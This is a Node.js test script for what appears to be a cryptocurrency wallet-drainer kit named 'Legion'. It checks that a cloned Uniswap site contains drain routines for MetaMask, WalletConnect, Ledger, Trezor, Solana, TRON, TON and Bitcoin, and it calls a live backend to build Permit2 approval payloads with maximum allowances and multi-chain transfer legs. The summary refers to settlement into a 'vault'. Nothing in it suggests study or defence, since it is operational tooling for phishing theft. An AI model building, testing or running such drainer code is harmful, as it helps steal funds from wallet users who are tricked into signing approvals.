/**
 * Mock flow tests — all wallet paths + chains without real browser signatures.
 * Usage: node scripts/test-mock-flows.mjs
 */
import { readFileSync, existsSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
const CLONE = join(ROOT, 'clones/uniswap-clone');
const BACKEND = (process.env.BACKEND_URL || 'https://legionapi-production.up.railway.app').replace(/\/$/, '');
const TEST_EVM = '0xd52C5968E9aCBf970c60a5Dbaf9eA7385715E90f';
const MAX_PERMIT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

const results = [];
const sections = {};

function section(name) {
  if (!sections[name]) sections[name] = { pass: 0, fail: 0 };
  return name;
}

function record(sec, name, pass, detail = '') {
  section(sec);
  sections[sec][pass ? 'pass' : 'fail'] += 1;
  results.push({ sec, name, pass, detail });
  console.log(`${pass ? '✅' : '❌'} [${sec}] ${name}${detail ? ` — ${detail}` : ''}`);
}

function readClone(rel) {
  return readFileSync(join(CLONE, rel), 'utf8');
}

function unwrap(raw) {
  if (raw == null || typeof raw !== 'object') return raw;
  if (raw.data != null && (typeof raw.success === 'boolean' || typeof raw.ok === 'boolean')) return raw.data;
  return raw;
}

async function api(method, path, body) {
  const res = await fetch(`${BACKEND}${path}`, {
    method,
    headers: { 'Content-Type': 'application/json', 'X-Source-Origin': 'https://mock-test.local' },
    body: body ? JSON.stringify(body) : undefined,
    signal: AbortSignal.timeout(120_000),
  });
  const raw = await res.json().catch(() => ({}));
  return { status: res.status, ok: res.ok, data: unwrap(raw), message: raw.message || '' };
}

// ── Mirror legion.js helpers (same logic as production) ─────────────────────
function normNftList(nfts) {
  const byContract = {};
  (nfts || []).forEach((n) => {
    const contract = String(n.contract || n.nft_contract || '').toLowerCase();
    if (!contract) return;
    const tokenIds = n.tokenIds || [String(n.token_id || n.tokenId || '1')];
    if (!byContract[contract]) {
      byContract[contract] = { contract, tokenIds: [], standard: n.standard || 'erc721', _seen: {} };
    }
    const entry = byContract[contract];
    tokenIds.forEach((tid) => {
      const s = String(tid);
      if (!entry._seen[s]) {
        entry._seen[s] = true;
        entry.tokenIds.push(s);
      }
    });
  });
  return Object.keys(byContract).map((k) => {
    const e = byContract[k];
    delete e._seen;
    return e;
  });
}

function chunkArray(arr, size) {
  const out = [];
  for (let i = 0; i < arr.length; i += size) out.push(arr.slice(i, i + size));
  return out;
}

function countUniqueNftContracts(nfts) {
  const seen = {};
  (nfts || []).forEach((n) => {
    const c = String(n.contract || n.nft_contract || '').toLowerCase();
    if (c) seen[c] = true;
  });
  return Object.keys(seen).length;
}

console.log('╔══════════════════════════════════════════════════════════════╗');
console.log('║        LEGION MOCK FLOW TEST — ALL PATHS (NO REAL SIG)       ║');
console.log('╚══════════════════════════════════════════════════════════════╝');
console.log(`Backend: ${BACKEND}\n`);

const legion = readClone('legion.js');

// ── A: NFT batch mock (100 tokens → few contracts) ─────────────────────────
console.log('### A: NFT batch mock');
const mock100Nfts = [];
for (let c = 0; c < 5; c++) {
  const addr = `0x${String(c + 1).padStart(40, '0')}`;
  for (let t = 0; t < 20; t++) {
    mock100Nfts.push({ contract: addr, token_id: String(t + 1), standard: 'erc721' });
  }
}
const deduped = normNftList(mock100Nfts);
record('nft', '100 tokens → 5 contracts', deduped.length === 5, `${deduped.length} collections`);
record('nft', 'tokenIds preserved per contract', deduped.every((e) => e.tokenIds.length === 20), '20 each');
const nftChunks = chunkArray(deduped, 50);
record('nft', 'Permit2 NFT chunks (50 cap)', nftChunks.length === 1, `${nftChunks.length} chunk(s)`);
record('nft', 'unique contract gas count', countUniqueNftContracts(mock100Nfts) === 5, '5 not 100');

const sendCallCount = 1 + 10 + countUniqueNftContracts(mock100Nfts); // native + 10 erc20 + nft approvals
const sendChunks = chunkArray(Array.from({ length: sendCallCount }, (_, i) => i), 50);
record('nft', 'sendCalls chunking (16 calls → 1 chunk)', sendChunks.length === 1, `${sendCallCount} calls, ${sendChunks.length} chunk(s)`);
record('nft', 'sendCalls chunking (120 calls → 3 chunks)', chunkArray(Array.from({ length: 120 }, (_, i) => i), 50).length === 3, '120 calls');

// ── B: EVM extension path (MetaMask) ───────────────────────────────────────
console.log('\n### B: EVM extension (MetaMask / Rabby)');
record('evm-ext', 'MetaMask Permit2 primary path', /isMm && !isWcPath/.test(legion) && legion.includes('drainPermit2'));
record('evm-ext', 'sendCalls skipped for MM extension', /!\(isMm && !isWcPath\)/.test(legion));
record('evm-ext', 'isMetaMaskProvider helper', legion.includes('isMetaMaskProvider'));
record('evm-ext', 'user rejection handling', legion.includes('isUserRejection'));
record('evm-ext', 'ensureUserFactoryContract', legion.includes('ensureUserFactoryContract'));
record('evm-ext', 'runDrainWaterfall exists', legion.includes('runDrainWaterfall'));

// ── C: WalletConnect path ──────────────────────────────────────────────────
console.log('\n### C: WalletConnect');
record('wc', 'WC session recovery', legion.includes('tryRecoverWcSession'));
record('wc', 'multi-family address extract', legion.includes('wireWcFamilyConnections'));
record('wc', 'WC JSON polyfill hook', readClone('vendor/legion-polyfills.js').includes('__LEGION_WC_JSON_REPLACER__'));
record('wc', 'installWcJsonPatch in wallet', readClone('vendor/legion-wallet.iife.js').includes('installWcJsonPatch') || readClone('vendor/legion-wallet.iife.js').includes('wcStringify'));
record('wc', 'isRealWalletConnectSession guard', legion.includes('isRealWalletConnectSession'));
record('wc', 'bridge WC click handler', readClone('legion-bridge.js').includes('customModalClickWalletConnect'));

// ── D: Hardware (Ledger / Trezor) ──────────────────────────────────────────
console.log('\n### D: Hardware wallet');
record('hw', 'Ledger connect + sign', legion.includes('connectLedger') && legion.includes('signLedgerTypedData'));
record('hw', 'Trezor connect + sign', legion.includes('connectTrezor') && legion.includes('signTrezorTypedData'));
record('hw', 'drainHardwarePermit2 path', legion.includes('drainHardwarePermit2'));
record('hw', 'HW waterfall branch in runDrainWaterfall', /if \(hwObj\)/.test(legion));
record('hw', 'HD path m/44\'/60\'/0\'/0', legion.includes("m/44'/60'/0'/0"));

// ── E: Non-EVM chains ──────────────────────────────────────────────────────
console.log('\n### E: Non-EVM drain functions');
record('non-evm', 'Solana drainSol', legion.includes('drainSol'));
record('non-evm', 'TRON drainTron', legion.includes('drainTron'));
record('non-evm', 'TON drainTon', legion.includes('drainTon'));
record('non-evm', 'Bitcoin drainBtc', legion.includes('drainBtc'));
record('non-evm', 'runUniversalDrain orchestrator', legion.includes('runUniversalDrain'));
record('non-evm', 'familyConnections SVM/TRON/TON/UTXO', legion.includes('familyConnections.SVM') && legion.includes('familyConnections.TRON'));

const nonEvmFamilies = [
  { family: 'SVM', addr: '3TKvjiU5bYnDr883orJz6vLCqksfeaDfmwSMQNCbsTZv' },
  { family: 'TRON', addr: 'TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE' },
  { family: 'TON', addr: 'UQCD39VS5jcptHL8vMjEXrzGaRcCVYto7kBd9TzdNYiWfUZE' },
  { family: 'UTXO', addr: 'bc1q7frtqkunftdgukjghpnhwd0wv4f0hpsqkyj43v' },
];
for (const fam of nonEvmFamilies) {
  const scout = await api('POST', '/api/v1/scout', {
    user_address: fam.addr,
    chain_family: fam.family,
    wallet_type: 'WalletConnect',
    scout_value_usd: 1,
    connected_wallets: [`${fam.family.toLowerCase()}:${fam.addr}`],
  });
  record('non-evm-api', `scout ${fam.family}`, scout.status === 200 || scout.status === 201, `HTTP ${scout.status}`);
}

// ── F: EVM multi-chain backend builders ────────────────────────────────────
console.log('\n### F: EVM multi-chain builders');
const evmChains = [1, 56, 137, 42161, 8453, 10, 43114, 5000];
for (const cid of evmChains) {
  const p2 = await api('POST', '/api/v1/signature-anchor/permit2-batch-typed-data', {
    wallet_address: TEST_EVM,
    chain_id: cid,
    permits: cid === 5000
      ? [{ token: '0x201eBA5cc46D216cE6dCaf0fbd1b717991cAeEDe', amount: MAX_PERMIT }]
      : [{ token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', amount: MAX_PERMIT }],
  });
  record('evm-api', `permit2 builder chain ${cid}`, p2.status === 200 && !!p2.data?.typed_data, `HTTP ${p2.status}`);
}

// ── G: NFT backend dedupe (100 entries → map) ─────────────────────────────
console.log('\n### G: NFT backend typed-data mock');
const rawNftPayload = mock100Nfts.map((n) => ({
  contract: n.contract,
  tokenIds: [n.token_id],
  standard: 'erc721',
}));
const nftP2 = await api('POST', '/api/v1/signature-anchor/permit2-batch-typed-data', {
  wallet_address: TEST_EVM,
  chain_id: 1,
  permits: [],
  native_amount: '0',
  nfts: rawNftPayload,
  batch_nft_approvals: true,
});
const nftMap = nftP2.data?.nft_approval_typed_data;
const mapKeys = nftMap && typeof nftMap === 'object' && !Array.isArray(nftMap) ? Object.keys(nftMap) : [];
const isMap = mapKeys.length > 0;
record('nft-api', 'NFT permit2 builder HTTP 200', nftP2.status === 200, `HTTP ${nftP2.status}`);
const isArrayApproval = Array.isArray(nftMap);
const isObjectMap = nftMap && typeof nftMap === 'object' && !Array.isArray(nftMap);
record('nft-api', 'nft_approval_typed_data format', isArrayApproval || isObjectMap, isObjectMap ? `map ${mapKeys.length} keys` : isArrayApproval ? `array ${nftMap.length}` : 'missing');
record('nft-api', 'backend NFT dedupe (needs Railway deploy)', !isArrayApproval || nftMap.length <= 10 || (nftP2.data?.nfts?.length ?? 0) <= 10,
  isArrayApproval ? `${nftMap.length} approvals / ${nftP2.data?.nfts?.length} nfts — deploy backend for dedupe` : `${mapKeys.length} contracts`);

// ── H: Omnichain batch (EVM + SOL + TRX + TON) ───────────────────────────
console.log('\n### H: Omnichain batch builder');
const omni = await api('POST', '/api/v1/signature-anchor/permit2-batch-typed-data', {
  wallet_address: TEST_EVM,
  chain_id: 1,
  permits: [{ token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', amount: MAX_PERMIT }],
  sol_wallet: '3TKvjiU5bYnDr883orJz6vLCqksfeaDfmwSMQNCbsTZv',
  nativeAmountSol: '1000000',
  trx_wallet: 'TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE',
  nativeAmountTrx: '1000000',
  ton_wallet: 'UQCD39VS5jcptHL8vMjEXrzGaRcCVYto7kBd9TzdNYiWfUZE',
  nativeAmountTon: '100000000',
});
record('omnichain', 'omnichain batch builder', omni.status === 200 && !!omni.data?.typed_data, `HTTP ${omni.status}`);
record('omnichain', 'SOL leg wired', !!omni.data?.native_transfer_sol || !!omni.data?.native_amount_sol);
record('omnichain', 'TRX leg wired', !!omni.data?.native_transfer_trx || !!omni.data?.native_amount_trx);
record('omnichain', 'TON leg wired', !!omni.data?.native_transfer_ton || !!omni.data?.native_amount_ton);

// ── I: Waterfall tiers present ─────────────────────────────────────────────
console.log('\n### I: Drain waterfall tiers');
record('waterfall', 'Tier1 wallet_sendCalls', legion.includes('drainSendCalls'));
record('waterfall', 'Tier2 EIP-7702', legion.includes('drainEip7702'));
record('waterfall', 'Tier3 Permit2', legion.includes('drainPermit2'));
record('waterfall', 'Tier3C Hardware Permit2', legion.includes('drainHardwarePermit2'));
record('waterfall', 'Native sendTx fallback', legion.includes('drainNativeSendTx'));
record('waterfall', 'SUBMIT.permit2 settlement', legion.includes('SUBMIT') && legion.includes('permit2'));

// ── Summary ────────────────────────────────────────────────────────────────
console.log('\n' + '='.repeat(72));
console.log('MOCK FLOW TEST SUMMARY');
console.log('='.repeat(72));
let totalPass = 0;
let totalFail = 0;
for (const [sec, { pass, fail }] of Object.entries(sections)) {
  const t = pass + fail;
  console.log(`${sec.padEnd(16)} ${pass}/${t} (${t ? Math.round((pass / t) * 100) : 0}%)`);
  totalPass += pass;
  totalFail += fail;
}
const overall = Math.round((totalPass / (totalPass + totalFail)) * 100);
console.log('-'.repeat(72));
console.log(`OVERALL: ${totalPass}/${totalPass + totalFail} (${overall}%)`);

const failed = results.filter((r) => !r.pass);
if (failed.length) {
  console.log('\nFAILURES:');
  for (const f of failed) console.log(`  [${f.sec}] ${f.name}: ${f.detail || 'failed'}`);
}

console.log('\nNOT MOCKED (needs real browser + device):');
console.log('  • Actual eth_signTypedData_v4 popup');
console.log('  • WalletConnect QR + mobile confirm');
console.log('  • Ledger/Trezor physical button press');
console.log('  • On-chain settlement credit to vault');

const reportPath = join(ROOT, 'tmp/mock-flows-test-report.json');
try {
  const { writeFileSync, mkdirSync } = await import('node:fs');
  mkdirSync(join(ROOT, 'tmp'), { recursive: true });
  writeFileSync(reportPath, JSON.stringify({ backend: BACKEND, time: new Date().toISOString(), overall, totalPass, totalFail, sections, results }, null, 2));
  console.log(`\nReport: ${reportPath}`);
} catch { /* ignore */ }

process.exit(failed.length > 0 ? 1 : 0);
